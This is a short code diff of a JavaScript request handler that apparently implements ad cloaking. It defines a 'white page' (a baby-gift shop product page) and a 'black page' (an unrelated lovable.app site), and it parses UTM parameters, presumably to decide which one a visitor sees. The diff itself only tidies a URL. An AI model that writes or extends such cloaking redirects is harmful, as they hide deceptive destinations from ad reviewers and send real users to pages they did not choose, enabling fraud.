@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
     const whitePageURL = "https://www.zaybabyshop.at/en/products/personalisierte-geschenk-zur-geburt-junge";
-    const blackPageURL = "https://csshhhggot.lovable.app//";
+    const blackPageURL = "https://csshhhggot.lovable.app/";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
